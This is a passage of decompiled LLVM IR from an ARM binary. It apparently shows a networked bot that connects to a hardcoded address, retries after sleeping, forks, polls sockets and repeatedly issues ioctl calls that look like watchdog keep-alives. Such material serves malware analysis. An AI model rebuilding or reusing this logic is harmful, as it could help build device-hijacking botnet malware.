  store i32 2, i32* %stack_var_-44, align 4
  %v0_e00c = call i32 @function_120c4()
  %v0_e010 = load i32, i32* @r5, align 4
  %v2_e010 = inttoptr i32 %v0_e00c to i32*
  store i32 %v0_e010, i32* %v2_e010, align 4
  %v2_e014 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_e014, i32* @r7, align 4
  store i32 %v0_e00c, i32* @r4, align 4
  %v2_e020 = load i32, i32* @global_var_1c908.74, align 4
  %v3_e028 = bitcast i32* %stack_var_-44 to %sockaddr*
  %v4_e028 = call i32 @function_12210(i32 %v2_e020, %sockaddr* %v3_e028, i32 16)
  %v7_e02c = icmp eq i32 %v4_e028, -1
  br i1 %v7_e02c, label %dec_label_pc_e04c, label %dec_label_pc_e034

dec_label_pc_e034:                                ; preds = %bb
  %v2_e03c = load i32, i32* @global_var_1c908.74, align 4
  %v2_e040 = call i32 @function_122c4(i32 %v2_e03c, i32 1)
  br label %dec_label_pc_e044

dec_label_pc_e044:                                ; preds = %dec_label_pc_df60, %dec_label_pc_e058, %dec_label_pc_e034
  %v20_e048 = phi i32 [ %v3_df7c, %dec_label_pc_df60 ], [ %v1_e0a8, %dec_label_pc_e058 ], [ %v2_e040, %dec_label_pc_e034 ]
  store i32 %v3_df60, i32* @r4, align 4
  store i32 %v9_df60, i32* @r6, align 4
  store i32 %v12_df60, i32* @r7, align 4
  store i32 %v15_df60, i32* @r8, align 4
  ret i32 %v20_e048

dec_label_pc_e04c:                                ; preds = %bb
  %v0_e04c = load i32, i32* @r4, align 4
  %v1_e04c = inttoptr i32 %v0_e04c to i32*
  %v2_e04c = load i32, i32* %v1_e04c, align 4
  %v7_e050 = icmp eq i32 %v2_e04c, 99
  br i1 %v7_e050, label %dec_label_pc_e0b0, label %dec_label_pc_e058

dec_label_pc_e058:                                ; preds = %dec_label_pc_e0b0, %bb21, %dec_label_pc_e04c
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_e070 = load i32, i32* @global_var_1c908.74, align 4
  %v4_e088 = call i32 @function_1223c(i32 %v2_e070, %sockaddr* %v3_e028, i32 16)
  %v1_e090 = call i32 @function_12efc(i32 5)
  %v2_e094 = load i32, i32* @global_var_1c908.74, align 4
  %v1_e098 = call i32 @function_11af0(i32 %v2_e094)
  %v1_e0a4 = call i32 @function_d1c4(i32 9510)
  %v1_e0a8 = call i32 @function_df60(i32 %v1_e0a4)
  br label %dec_label_pc_e044

dec_label_pc_e0b0:                                ; preds = %dec_label_pc_e04c
  %v2_e0b0 = load i8, i8* bitcast (i8** @global_var_1c914.76 to i8*), align 4
  %v3_e0b0 = zext i8 %v2_e0b0 to i32
  %v1_e0b4 = load i32, i32* @r5, align 4
  %v9_e0b4 = icmp eq i32 %v3_e0b0, %v1_e0b4
  br i1 %v9_e0b4, label %dec_label_pc_e058, label %bb21

bb21:                                             ; preds = %dec_label_pc_e0b0
  %v2_e0bc = trunc i32 %v1_e0b4 to i8
  store i8 %v2_e0bc, i8* bitcast (i8** @global_var_1c914.76 to i8*), align 4
  br label %dec_label_pc_e058

; uselistorder directives
  uselistorder i32 %v3_df7c, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @function_d1c4, { 14, 3, 2, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32)* @function_122c4, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1c914.76 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1c914.76, { 1, 0 }
  uselistorder label %dec_label_pc_e058, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e044, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_e0d0() local_unnamed_addr {
dec_label_pc_e0d0:
  %stack_var_-16 = alloca i32, align 4
  %v3_e0d0 = load i32, i32* @r4, align 4
  store i32 %v3_e0d0, i32* %stack_var_-16, align 4
  %v9_e0d0 = load i32, i32* @r6, align 4
  %v3_e0d8 = call i32 @function_ec00(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_14368.79, i32 0, i32 0))
  store i32 %v3_e0d8, i32* @r5, align 4
  %v3_e0dc = icmp eq i32 %v3_e0d8, 0
  store i32 ptrtoint (i8** @global_var_1cb28.81 to i32), i32* @r6, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_14380.83 to i32), i32* @r0, align 4
  br i1 %v3_e0dc, label %dec_label_pc_e0d0.dec_label_pc_e144_crit_edge, label %dec_label_pc_e0ec

dec_label_pc_e0d0.dec_label_pc_e144_crit_edge:    ; preds = %dec_label_pc_e0d0
  br label %dec_label_pc_e144

dec_label_pc_e0ec:                                ; preds = %dec_label_pc_e0d0
  %v1_e0ec = add i32 %v3_e0d8, 4
  %v2_e0ec = inttoptr i32 %v1_e0ec to i32*
  %v3_e0ec = load i32, i32* %v2_e0ec, align 4
  store i32 %v3_e0ec, i32* @r4, align 4
  %v0_e0f0 = call i32 @function_e978()
  %v0_e0f4 = load i32, i32* @r5, align 4
  %v1_e0f4 = inttoptr i32 %v0_e0f4 to i8*
  %v2_e0f4 = load i8, i8* %v1_e0f4, align 1
  %v3_e0f4 = zext i8 %v2_e0f4 to i32
  %v2_e0f8 = call i32 @function_11878(i32 %v0_e0f0, i32 %v3_e0f4)
  %v0_e0fc = load i32, i32* @r4, align 4
  %v4_e0fc = mul i32 %v2_e0f8, 4
  %v5_e0fc = add i32 %v0_e0fc, %v4_e0fc
  %v6_e0fc = inttoptr i32 %v5_e0fc to i32*
  %v7_e0fc = load i32, i32* %v6_e0fc, align 4
  %v0_e100 = load i32, i32* @r5, align 4
  store i32 %v7_e0fc, i32* @global_var_1cb2c.84, align 4
  %v1_e108 = call i32 @function_ebdc(i32 %v0_e100)
  %v1_e110 = call i32 @function_10c20(i32 1)
  %v3_e11c = call i32 @function_10b3c(i32 1, i32* null)
  %v4_e11c = inttoptr i32 %v3_e11c to i8*
  %v2_e120 = add i32 %v3_e11c, 1
  %v3_e120 = inttoptr i32 %v2_e120 to i8*
  %v4_e120 = load i8, i8* %v3_e120, align 1
  %v3_e124 = load i8, i8* %v4_e11c, align 1
  store i8 %v4_e120, i8* bitcast (i32* @global_var_1cb2b.85 to i8*), align 4
  store i8 %v3_e124, i8* bitcast (i32* @global_var_1cb2a.86 to i8*), align 4
  %v2_e13c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e13c, i32* @r4, align 4
  store i32 %v9_e0d0, i32* @r6, align 4
  %v1_e140 = call i32 @function_10b68(i32 1)
  store i32 %v1_e140, i32* @r0, align 4
  br label %dec_label_pc_e144

dec_label_pc_e144:                                ; preds = %dec_label_pc_e0d0.dec_label_pc_e144_crit_edge, %dec_label_pc_e0ec
  %v0_e144 = phi i32 [ ptrtoint ([15 x i8]* @global_var_14380.83 to i32), %dec_label_pc_e0d0.dec_label_pc_e144_crit_edge ], [ %v1_e140, %dec_label_pc_e0ec ]
  %v1_e144 = call i32 @function_121ec(i32 %v0_e144)
  %v1_e148 = load i32, i32* @r6, align 4
  %v2_e148 = add i32 %v1_e148, 4
  %v3_e148 = inttoptr i32 %v2_e148 to i32*
  store i32 %v1_e144, i32* %v3_e148, align 4
  ret i32 %v1_e144

; uselistorder directives
  uselistorder label %dec_label_pc_e144, { 1, 0 }
}

define i32 @function_e15c(i32 %arg1) local_unnamed_addr {
dec_label_pc_e15c:
  %stack_var_-16 = alloca i32, align 4
  %v3_e15c = load i32, i32* @r4, align 4
  %v6_e15c = load i32, i32* @r5, align 4
  %v2_e160 = ptrtoint i32* %stack_var_-16 to i32
  %v0_e164 = call i32 @function_11b1c()
  %v7_e168 = icmp eq i32 %v0_e164, -1
  %. = zext i1 %v7_e168 to i32
  %tmp10 = icmp slt i32 %v0_e164, 1
  %storemerge4 = select i1 %tmp10, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_e184 = icmp eq i32 %storemerge4, 0
  store i32 %v0_e164, i32* @global_var_1ca88.88, align 4
  br i1 %v2_e184, label %dec_label_pc_e198, label %dec_label_pc_e190

dec_label_pc_e190:                                ; preds = %dec_label_pc_e15c
  store i32 %v3_e15c, i32* @r4, align 4
  store i32 %v6_e15c, i32* @r5, align 4
  ret i32 %v0_e164

dec_label_pc_e198:                                ; preds = %dec_label_pc_e15c
  store i32 1, i32* %stack_var_-16, align 4
  %v1_e1a4 = call i32 @function_10c20(i32 23)
  %v1_e1ac = call i32 @function_10c20(i32 24)
  %v0_e1b0 = load i32, i32* @r5, align 4
  %v2_e1b8 = inttoptr i32 %v0_e1b0 to i32*
  %v3_e1b8 = call i32 @function_10b3c(i32 23, i32* %v2_e1b8)
  %v2_e1c0 = inttoptr i32 %v3_e1b8 to i8*
  %v3_e1c0 = call i32 @function_11c1c(i8* %v2_e1c0, i32 2)
  %v7_e1c4 = icmp eq i32 %v3_e1c0, -1
  store i32 %v3_e1c0, i32* @r4, align 4
  br i1 %v7_e1c4, label %dec_label_pc_e20c, label %dec_label_pc_e1d0

dec_label_pc_e1d0:                                ; preds = %dec_label_pc_e20c, %dec_label_pc_e198
  %v0_e1dc = phi i32 [ %v3_e21c, %dec_label_pc_e20c ], [ %v3_e1c0, %dec_label_pc_e198 ]
  %v3_e1e4 = call i32 @function_11ba0(i32 %v0_e1dc, i32 -2147199228, i32 %v2_e160)
  br label %dec_label_pc_e1e8

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1e8, %dec_label_pc_e1d0
  %v0_e1f4 = load i32, i32* @r4, align 4
  %v3_e1fc = call i32 @function_11ba0(i32 %v0_e1f4, i32 -2147199227, i32 0)
  %v1_e204 = call i32 @function_12efc(i32 10)
  br label %dec_label_pc_e1e8

dec_label_pc_e20c:                                ; preds = %dec_label_pc_e198
  %v0_e20c = load i32, i32* @r5, align 4
  %v2_e214 = inttoptr i32 %v0_e20c to i32*
  %v3_e214 = call i32 @function_10b3c(i32 24, i32* %v2_e214)
  %v2_e21c = inttoptr i32 %v3_e214 to i8*
  %v3_e21c = call i32 @function_11c1c(i8* %v2_e21c, i32 2)
  %v3_e220 = icmp eq i32 %v3_e21c, -1
  store i32 %v3_e21c, i32* @r4, align 4
  br i1 %v3_e220, label %dec_label_pc_e22c, label %dec_label_pc_e1d0

dec_label_pc_e22c:                                ; preds = %dec_label_pc_e20c
  %v1_e230 = call i32 @function_10b68(i32 23)
  %v1_e238 = call i32 @function_10b68(i32 24)
  %v0_e23c = load i32, i32* @r5, align 4
  %v1_e240 = call i32 @function_12e68(i32 %v0_e23c)
  %v0_e244 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e244, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_e22c
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_e22c, %bb13
  ret i32 %v1_e240

; uselistorder directives
  uselistorder i32 %v3_e21c, { 1, 2, 0 }
  uselistorder i32 %v3_e1c0, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_e164, { 3, 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_11ba0, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
}

define i32 @function_e248(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_e248:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-38 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-380 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-508 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e248 = load i32, i32* @r4, align 4
  store i32 %v3_e248, i32* %stack_var_-36, align 4
  %v9_e248 = load i32, i32* @r6, align 4
  %v15_e248 = load i32, i32* @r8, align 4
  %v2_e254 = ptrtoint i32* %stack_var_-508 to i32
  store i32 %v2_e254, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_e254, i32* @r0, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v1_e26c = call i32 @function_1243c(i32 %v2_e254)
  store i32 %v2_e254, i32* @r0, align 4
  %v2_e278 = call i32 @function_1240c(i32 %v2_e254, i32 2)
  %v0_e27c = load i32, i32* @r5, align 4
  store i32 %v0_e27c, i32* %r2.global-to-local, align 4
  %v3_e288 = bitcast i32* %stack_var_-508 to %_TYPEDEF_sigset_t*
  %v4_e288 = call i32 @function_11d6c(i32 %v0_e27c, %_TYPEDEF_sigset_t* %v3_e288, i32 %v0_e27c)
  %v2_e294 = call i32 @function_12454(i32 17, i32 1)
  %v2_e2a0 = call i32 @function_12454(i32 5, i32 ptrtoint (i32* @global_var_df48.90 to i32))
  %v0_e2a4 = call i32 @function_114a4()
  store i32 %v0_e2a4, i32* @global_var_1cb1c.49, align 4
  store i32 1494907824, i32* %r2.global-to-local, align 4
  store i8 23, i8* bitcast (i32* @global_var_1cb2b.85 to i8*), align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i8 2, i8* bitcast (i8** @global_var_1cb28.81 to i8*), align 4
  store i32 1494907824, i32* @global_var_1cb2c.84, align 4
  %v0_e2cc = load i32, i32* @r5, align 4
  %v1_e2cc = trunc i32 %v0_e2cc to i8
  store i8 %v1_e2cc, i8* bitcast (i32* @global_var_1cb2a.86 to i8*), align 4
  store i8 %v1_e2cc, i8* bitcast (i32* @global_var_1cb29.94 to i8*), align 4
  %v6_e2d4 = call i32 @function_10cd8(i32 %v0_e2a4, i32 ptrtoint (i8** @global_var_1cb28.81 to i32), i32 1494907824, i32 2)
  store i32 ptrtoint (i32* @global_var_e0d0.70 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_e0d0.70 to i32), i32* @global_var_1c910.72, align 4
  %v1_e2e4 = call i32 @function_df60(i32 %v6_e2d4)
  %v1_e2e8 = call i32 @function_e9d0(i32 %v1_e2e4)
  %v2_e2f0 = ptrtoint i32* %stack_var_-124 to i32
  store i32 %v2_e2f0, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_e2f8 = call i32 @function_1128c()
  %v0_e2fc = load i32, i32* @r6, align 4
  %v7_e2fc = icmp eq i32 %v0_e2fc, 2
  br i1 %v7_e2fc, label %dec_label_pc_e424, label %dec_label_pc_e304

dec_label_pc_e304:                                ; preds = %dec_label_pc_e424, %dec_label_pc_e248, %dec_label_pc_e434
  %v0_e304 = call i32 @function_e978()
  store i32 %v0_e304, i32* %r6.global-to-local, align 4
  %v0_e30c = load i32, i32* @r8, align 4
  %v1_e30c = inttoptr i32 %v0_e30c to i32*
  %v2_e30c = load i32, i32* %v1_e30c, align 4
  %v1_e310 = inttoptr i32 %v2_e30c to i8*
  %v2_e310 = call i32 @function_111ec(i8* %v1_e310)
  %v0_e318 = load i32, i32* @r8, align 4
  %v1_e318 = inttoptr i32 %v0_e318 to i32*
  %v2_e318 = load i32, i32* %v1_e318, align 4
  %v1_e31c = inttoptr i32 %v2_e318 to i8*
  %v2_e31c = call i32 @function_111ec(i8* %v1_e31c)
  %v1_e320 = sub i32 20, %v2_e310
  store i32 %v2_e31c, i32* @r5, align 4
  %v0_e328 = load i32, i32* %r6.global-to-local, align 4
  %v2_e32c = call i32 @function_11878(i32 %v0_e328, i32 %v1_e320)
  %v1_e334 = load i32, i32* @r5, align 4
  %v2_e334 = add i32 %v1_e334, %v2_e32c
  store i32 %v2_e334, i32* @r4, align 4
  %v2_e338 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_e338, i32* @r6, align 4
  %v2_e344 = call i32 @function_ea2c(i32 %v2_e338, i32 %v2_e334)
  %v2_e348 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_e348, i32* %r2.global-to-local, align 4
  %v1_e34c = load i32, i32* @r4, align 4
  %v2_e34c = add i32 %v1_e34c, %v2_e348
  store i32 %v2_e34c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_e358 = load i32, i32* @r8, align 4
  %v1_e358 = inttoptr i32 %v0_e358 to i32*
  %v2_e358 = load i32, i32* %v1_e358, align 4
  store i32 %v2_e358, i32* @r0, align 4
  %v3_e35c = add i32 %v2_e34c, -56
  %v4_e35c = inttoptr i32 %v3_e35c to i8*
  store i8 0, i8* %v4_e35c, align 1
  %v2_e360 = inttoptr i32 %v2_e358 to i8*
  %v3_e360 = call i32 @function_11214(i8* %v2_e360, i32 %v2_e338)
  store i32 32, i32* @r1, align 4
  store i32 %v2_e338, i32* @r0, align 4
  %v0_e36c = call i32 @function_1128c()
  %v0_e370 = call i32 @function_e978()
  store i32 %v0_e370, i32* @r7, align 4
  %v0_e378 = load i32, i32* @r8, align 4
  %v1_e378 = inttoptr i32 %v0_e378 to i32*
  %v2_e378 = load i32, i32* %v1_e378, align 4
  %v1_e37c = inttoptr i32 %v2_e378 to i8*
  %v2_e37c = call i32 @function_111ec(i8* %v1_e37c)
  %v0_e384 = load i32, i32* @r8, align 4
  %v1_e384 = inttoptr i32 %v0_e384 to i32*
  %v2_e384 = load i32, i32* %v1_e384, align 4
  %v1_e388 = inttoptr i32 %v2_e384 to i8*
  %v2_e388 = call i32 @function_111ec(i8* %v1_e388)
  %v1_e38c = sub i32 20, %v2_e37c
  store i32 %v2_e388, i32* @r5, align 4
  %v0_e394 = load i32, i32* @r7, align 4
  %v2_e398 = call i32 @function_11878(i32 %v0_e394, i32 %v1_e38c)
  %v1_e39c = load i32, i32* @r5, align 4
  %v2_e39c = add i32 %v1_e39c, %v2_e398
  store i32 %v2_e39c, i32* @r4, align 4
  %v2_e3a8 = call i32 @function_ea2c(i32 %v2_e338, i32 %v2_e39c)
  %v1_e3b0 = load i32, i32* @r4, align 4
  %v2_e3b0 = add i32 %v1_e3b0, %v2_e348
  store i32 %v2_e3b0, i32* @r3, align 4
  %v0_e3b4 = load i32, i32* @sb, align 4
  %v1_e3b4 = trunc i32 %v0_e3b4 to i8
  %v3_e3b4 = add i32 %v2_e3b0, -56
  %v4_e3b4 = inttoptr i32 %v3_e3b4 to i8*
  store i8 %v1_e3b4, i8* %v4_e3b4, align 1
  %v2_e3c0 = call i32 @function_11c88(i32 15, i32 %v2_e338)
  %v1_e3c8 = call i32 @function_10c20(i32 3)
  %v3_e3d4 = call i32 @function_10b3c(i32 3, i32* nonnull %stack_var_-52)
  %v3_e3d8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_e3d8, i32* %r2.global-to-local, align 4
  %v3_e3e4 = inttoptr i32 %v3_e3d4 to i32*
  %v4_e3e4 = call i32 @function_11e18(i32 1, i32* %v3_e3e4, i32 %v3_e3d8)
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_e3f4 = call i32 @function_11e18(i32 1, i32* nonnull @global_var_14390.98, i32 1)
  %v1_e3fc = call i32 @function_10b68(i32 3)
  %v1_e400 = call i32 @function_8650(i32 %v1_e3fc)
  %v1_e404 = call i32 @function_d760(i32 %v1_e400)
  %v1_e408 = call i32 @function_e15c(i32 %v1_e404)
  %v0_e40c = call i32 @function_11b1c()
  %v1_e410 = load i32, i32* @sb, align 4
  %v7_e414 = icmp sgt i32 %v0_e40c, %v1_e410
  br i1 %v7_e414, label %dec_label_pc_e418, label %dec_label_pc_e460

dec_label_pc_e418:                                ; preds = %dec_label_pc_e304
  store i32 %v9_e248, i32* %r6.global-to-local, align 4
  store i32 %v15_e248, i32* %r8.global-to-local, align 4
  ret i32 0

dec_label_pc_e424:                                ; preds = %dec_label_pc_e248
  %v0_e424 = load i32, i32* @r8, align 4
  %v1_e424 = add i32 %v0_e424, 4
  %v2_e424 = inttoptr i32 %v1_e424 to i32*
  %v3_e424 = load i32, i32* %v2_e424, align 4
  %v1_e428 = inttoptr i32 %v3_e424 to i8*
  %v2_e428 = call i32 @function_111ec(i8* %v1_e428)
  %v8_e430 = icmp sgt i32 %v2_e428, 31
  br i1 %v8_e430, label %dec_label_pc_e304, label %dec_label_pc_e434

dec_label_pc_e434:                                ; preds = %dec_label_pc_e424
  %v0_e438 = load i32, i32* @r8, align 4
  %v1_e438 = add i32 %v0_e438, 4
  %v2_e438 = inttoptr i32 %v1_e438 to i32*
  %v3_e438 = load i32, i32* %v2_e438, align 4
  store i32 %v2_e2f0, i32* @r0, align 4
  %v2_e440 = bitcast i32* %stack_var_-124 to i8*
  %v3_e440 = call i32 @function_11214(i8* %v2_e440, i32 %v3_e438)
  %v0_e444 = load i32, i32* @r8, align 4
  %v1_e444 = add i32 %v0_e444, 4
  %v2_e444 = inttoptr i32 %v1_e444 to i32*
  %v3_e444 = load i32, i32* %v2_e444, align 4
  %v1_e44c = inttoptr i32 %v3_e444 to i8*
  %v2_e44c = call i32 @function_111ec(i8* %v1_e44c)
  store i32 %v2_e44c, i32* @r1, align 4
  store i32 %v3_e444, i32* @r0, align 4
  %v0_e458 = call i32 @function_1128c()
  br label %dec_label_pc_e304

dec_label_pc_e460:                                ; preds = %dec_label_pc_e304
  %v1_e460 = call i32 @function_11d40(i32 %v0_e40c)
  %v0_e464 = load i32, i32* @sb, align 4
  %v1_e468 = call i32 @function_11af0(i32 %v0_e464)
  %v1_e470 = call i32 @function_11af0(i32 1)
  %v1_e478 = call i32 @function_11af0(i32 2)
  %v1_e47c = call i32 @function_8650(i32 %v1_e478)
  %v1_e480 = call i32 @function_d760(i32 %v1_e47c)
  %v1_e484 = call i32 @function_e15c(i32 %v1_e480)
  %v1_e488 = call i32 @function_f3bc(i32 %v1_e484)
  %v2_e490 = ptrtoint i32* %stack_var_-1532 to i32
  store i32 %v2_e490, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c90c.101 to i32), i32* @sl, align 4
  %v2_e4a8 = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v2_e4a8, i32* @r6, align 4
  %v2_e4ac = ptrtoint i32* %stack_var_-380 to i32
  store i32 %v2_e4ac, i32* @r7, align 4
  %v2_e57c = ptrtoint i32* %stack_var_-60 to i32
  %v4_e834 = bitcast i8** %stack_var_-38 to i32*
  %v2_e7cc = ptrtoint i32* %stack_var_-44 to i32
  %v2_e7d0 = ptrtoint i32* %stack_var_-48 to i32
  %v1_e844 = bitcast i32* %stack_var_-124 to i8*
  br label %dec_label_pc_e4b0

dec_label_pc_e4b0:                                ; preds = %dec_label_pc_e4b0.backedge, %dec_label_pc_e460
  %v2_e4b843 = phi i32 [ %v2_e4b843.pre, %dec_label_pc_e4b0.backedge ], [ %v2_e4a8, %dec_label_pc_e460 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_e4b845 = inttoptr i32 %v2_e4b843 to i32*
  store i32 0, i32* %v4_e4b845, align 4
  %v0_e4bc46 = load i32, i32* %r3.global-to-local, align 4
  %v1_e4bc47 = add i32 %v0_e4bc46, 4
  store i32 %v1_e4bc47, i32* %r3.global-to-local, align 4
  %v7_e4c048 = icmp eq i32 %v1_e4bc47, 128
  br i1 %v7_e4c048, label %dec_label_pc_e4c8, label %dec_label_pc_e4b8.dec_label_pc_e4b8_crit_edge

dec_label_pc_e4b8.dec_label_pc_e4b8_crit_edge:    ; preds = %dec_label_pc_e4b0, %dec_label_pc_e4b8.dec_label_pc_e4b8_crit_edge
  %v1_e4bc49 = phi i32 [ %v1_e4bc, %dec_label_pc_e4b8.dec_label_pc_e4b8_crit_edge ], [ %v1_e4bc47, %dec_label_pc_e4b0 ]
  %v0_e4b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_e4b8 = load i32, i32* @r6, align 4
  %v3_e4b8 = add i32 %v2_e4b8, %v1_e4bc49
  %v4_e4b8 = inttoptr i32 %v3_e4b8 to i32*
  store i32 %v0_e4b8.pre, i32* %v4_e4b8, align 4
  %v0_e4bc = load i32, i32* %r3.global-to-local, align 4
  %v1_e4bc = add i32 %v0_e4bc, 4
  store i32 %v1_e4bc, i32* %r3.global-to-local, align 4
  %v7_e4c0 = icmp eq i32 %v1_e4bc, 128
  br i1 %v7_e4c0, label %dec_label_pc_e4c8, label %dec_label_pc_e4b8.dec_label_pc_e4b8_crit_edge

dec_label_pc_e4c8:                                ; preds = %dec_label_pc_e4b8.dec_label_pc_e4b8_crit_edge, %dec_label_pc_e4b0
  %v0_e4c8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e4c8, i32* %r3.global-to-local, align 4
  store i32 %v0_e4c8, i32* @r4, align 4
  %v2_e4d050 = load i32, i32* @r7, align 4
  %v3_e4d051 = add i32 %v2_e4d050, %v0_e4c8
  %v4_e4d052 = inttoptr i32 %v3_e4d051 to i32*
  store i32 %v0_e4c8, i32* %v4_e4d052, align 4
  %v0_e4d453 = load i32, i32* %r3.global-to-local, align 4
  %v1_e4d454 = add i32 %v0_e4d453, 4
  store i32 %v1_e4d454, i32* %r3.global-to-local, align 4
  %v7_e4d855 = icmp eq i32 %v1_e4d454, 128
  br i1 %v7_e4d855, label %dec_label_pc_e4e0, label %dec_label_pc_e4d0.dec_label_pc_e4d0_crit_edge

dec_label_pc_e4d0.dec_label_pc_e4d0_crit_edge:    ; preds = %dec_label_pc_e4c8, %dec_label_pc_e4d0.dec_label_pc_e4d0_crit_edge
  %v1_e4d456 = phi i32 [ %v1_e4d4, %dec_label_pc_e4d0.dec_label_pc_e4d0_crit_edge ], [ %v1_e4d454, %dec_label_pc_e4c8 ]
  %v0_e4d0.pre = load i32, i32* @r4, align 4
  %v2_e4d0 = load i32, i32* @r7, align 4
  %v3_e4d0 = add i32 %v2_e4d0, %v1_e4d456
  %v4_e4d0 = inttoptr i32 %v3_e4d0 to i32*
  store i32 %v0_e4d0.pre, i32* %v4_e4d0, align 4
  %v0_e4d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e4d4 = add i32 %v0_e4d4, 4
  store i32 %v1_e4d4, i32* %r3.global-to-local, align 4
  %v7_e4d8 = icmp eq i32 %v1_e4d4, 128
  br i1 %v7_e4d8, label %dec_label_pc_e4e0, label %dec_label_pc_e4d0.dec_label_pc_e4d0_crit_edge

dec_label_pc_e4e0:                                ; preds = %dec_label_pc_e4d0.dec_label_pc_e4d0_crit_edge, %dec_label_pc_e4c8
  %v2_e4e0 = load i32, i32* @global_var_1c908.74, align 4
  %v7_e4e4 = icmp eq i32 %v2_e4e0, -1
  br i1 %v7_e4e4, label %dec_label_pc_e510, label %dec_label_pc_e4ec

dec_label_pc_e4ec:                                ; preds = %dec_label_pc_e4e0
  %v3_e4ec = udiv i32 %v2_e4e0, 32
  %v3_e4f0 = mul nuw nsw i32 %v3_e4ec, 4
  %v2_e4f8 = add i32 %v3_e4f0, %v2_e348
  store i32 %v2_e4f8, i32* %r3.global-to-local, align 4
  %v1_e4fc = add i32 %v2_e4f8, -216
  %v2_e4fc = inttoptr i32 %v1_e4fc to i32*
  %v3_e4fc = load i32, i32* %v2_e4fc, align 4
  %v1_e500 = urem i32 %v2_e4e0, 32
  %v7_e508 = shl i32 1, %v1_e500
  %v8_e508 = or i32 %v3_e4fc, %v7_e508
  store i32 %v8_e508, i32* %r2.global-to-local, align 4
  store i32 %v8_e508, i32* %v2_e4fc, align 4
  br label %dec_label_pc_e510

dec_label_pc_e510:                                ; preds = %dec_label_pc_e4e0, %dec_label_pc_e4ec
  %v2_e510 = load i32, i32* @global_var_1c90c.101, align 4
  store i32 %v2_e510, i32* %r3.global-to-local, align 4
  %v7_e514 = icmp eq i32 %v2_e510, -1
  store i32 ptrtoint (i32* @global_var_1c90c.101 to i32), i32* %r8.global-to-local, align 4
  br i1 %v7_e514, label %dec_label_pc_e74c, label %dec_label_pc_e520

dec_label_pc_e520:                                ; preds = %dec_label_pc_e74c, %dec_label_pc_e510, %.thread
  store i32 ptrtoint (i8** @global_var_1ca8c.103 to i32), i32* %r2.global-to-local, align 4
  %v2_e524 = load i8, i8* bitcast (i8** @global_var_1ca8c.103 to i8*), align 4
  %v2_e528 = icmp eq i8 %v2_e524, 0
  %v2_e630 = load i32, i32* @global_var_1c90c.101, align 4
  %v3_e634 = udiv i32 %v2_e630, 32
  store i32 %v3_e634, i32* %r3.global-to-local, align 4
  br i1 %v2_e528, label %dec_label_pc_e630, label %dec_label_pc_e530

dec_label_pc_e530:                                ; preds = %dec_label_pc_e520
  %v3_e538 = mul nuw nsw i32 %v3_e634, 4
  %v2_e540 = add i32 %v3_e538, %v2_e348
  store i32 %v2_e540, i32* %r3.global-to-local, align 4
  %v1_e544 = add i32 %v2_e540, -344
  %v2_e544 = inttoptr i32 %v1_e544 to i32*
  %v3_e544 = load i32, i32* %v2_e544, align 4
  %v1_e548 = urem i32 %v2_e630, 32
  %v7_e550 = shl i32 1, %v1_e548
  %v8_e550 = or i32 %v3_e544, %v7_e550
  store i32 %v8_e550, i32* %r2.global-to-local, align 4
  store i32 %v8_e550, i32* %v2_e544, align 4
  br label %dec_label_pc_e558

dec_label_pc_e558:                                ; preds = %dec_label_pc_e630, %dec_label_pc_e530
  %v2_e558 = load i32, i32* @global_var_1c908.74, align 4
  %v2_e55c = load i32, i32* @global_var_1c90c.101, align 4
  store i32 %v2_e55c, i32* %r3.global-to-local, align 4
  %v5_e568 = icmp slt i32 %v2_e558, %v2_e55c
